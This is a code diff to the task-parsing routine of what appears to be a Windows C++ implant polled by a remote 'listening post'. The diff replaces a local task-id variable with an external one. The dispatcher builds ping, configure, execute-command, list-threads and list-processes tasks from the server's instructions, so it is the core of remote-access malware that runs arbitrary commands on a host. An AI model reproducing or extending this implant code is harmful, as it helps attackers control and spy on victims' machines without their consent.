@@ -16,8 +16,7 @@
 #include <Windows.h>
 #include <tlhelp32.h>
 
-bool idSet = false;
-std::string id;
+extern std::string ids;
 // Function to parse the tasks from the property tree returned by the listening post
 // Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
@@ -25,45 +24,38 @@ std::string id;
     // Get the task type and identifier, declare our variables
     const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
     const auto idString = taskTree.get_child("task_id").get_value<std::string>();
-    //std::stringstream idStringStream{ idString };
-    if (idSet == false) 
-    { 
-        id = idString;
-        idSet = true;
-    }
-    //idStringStream >> id;
 
     // Conditionals to determine which task should be executed based on key provided
     // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
     // ===========================================================================================
-    if (taskType == PingTask::key && idString == id) {
+    if (taskType == PingTask::key && idString == ids) {
         return PingTask{
-            id
+            ids
         };
     }
-    if (taskType == ConfigureTask::key && idString == id) {
+    if (taskType == ConfigureTask::key && idString == ids) {
         return ConfigureTask{
-            id,
+            ids,
             taskTree.get_child("dwell").get_value<double>(),
             taskTree.get_child("running").get_value<bool>(),
             std::move(setter)
         };
     }
-    if (taskType == ExecuteTask::key && idString == id) {
+    if (taskType == ExecuteTask::key && idString == ids) {
         return ExecuteTask{
-            id,
+            ids,
             taskTree.get_child("command").get_value<std::string>()
         };
     }
-    if (taskType == ListThreadsTask::key && idString == id) {
+    if (taskType == ListThreadsTask::key && idString == ids) {
         return ListThreadsTask{
-            id,
+            ids,
             taskTree.get_child("procid").get_value<std::string>()
         };
     }
-    if (taskType == ListRunningProcesses::key && idString == id) {
+    if (taskType == ListRunningProcesses::key && idString == ids) {
         return ListRunningProcesses{
-            id
+            ids
         };
     }
 
